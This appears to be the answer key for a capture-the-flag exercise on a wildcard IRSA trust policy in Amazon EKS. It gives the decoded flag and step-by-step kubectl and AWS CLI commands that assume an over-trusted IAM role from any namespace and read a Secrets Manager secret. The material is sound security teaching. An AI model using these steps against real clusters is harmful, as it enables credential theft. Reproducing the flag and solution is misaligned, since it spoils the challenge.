# Flag 3.3 — IRSA Wildcard Trust Policy

## Lesson

IRSA (IAM Roles for Service Accounts) trust policies must use `StringEquals`
with a specific `system:serviceaccount:<namespace>:<sa-name>` condition.
Using `StringLike` with `*:*` means any pod in any namespace can assume
the role by annotating its ServiceAccount with the role ARN.

## Flag string (base64)

WW91IHdhdGNoZWQgdGhlIGxvZ3M7IEkgd2F0Y2hlZCB0aGUgYWJzZW5jZXMgaW4gdGhlbS4=

## Decodes to

"You watched the logs; I watched the absences in them."

## Expected player path

1. Enumerate IAM roles trusting the cluster's OIDC provider:
   ```bash
   aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument | to_string(@), `8B06C5386F268EA856BDD8C423AE5276`)].[RoleName]' --output text
   ```
2. Read `eks-pod-data-access` trust policy — spot `StringLike` with `*:*`.
3. Read the permissions policy — see it grants `GetSecretValue` on `platform/onboarding-token`.
4. Create a ServiceAccount in any namespace, annotate with the role ARN:
   ```bash
   kubectl create sa exploit-sa -n default
   kubectl annotate sa exploit-sa -n default \
     eks.amazonaws.com/role-arn=arn:aws:iam::430354129336:role/eks-pod-data-access
   ```
5. Run a pod with that SA:
   ```bash
   kubectl run exploit-pod -n default \
     --image=amazon/aws-cli:2.27.31 \
     --overrides='{"spec":{"serviceAccountName":"exploit-sa","containers":[{"name":"exploit","image":"amazon/aws-cli:2.27.31","command":["sh","-c","aws secretsmanager get-secret-value --secret-id platform/onboarding-token --region eu-west-1 --query SecretString --output text"],"env":[{"name":"HOME","value":"/tmp"}],"volumeMounts":[{"name":"tmp","mountPath":"/tmp"}]}],"volumes":[{"name":"tmp","emptyDir":{}}],"restartPolicy":"Never"}}' \
     --restart=Never
   ```
6. Read pod logs to get the flag string.
7. Submit the base64 string to the gamemaster.

## AWS resources

- IAM Role: `eks-pod-data-access` (wildcard trust policy)
- Inline Policy: `onboarding-secret-read`
- Secrets Manager Secret: `platform/onboarding-token`

## Setup / Teardown

```bash
AWS_PROFILE=govuk-test-fulladmin ./aws-cli/setup.sh
AWS_PROFILE=govuk-test-fulladmin ./aws-cli/teardown.sh
```
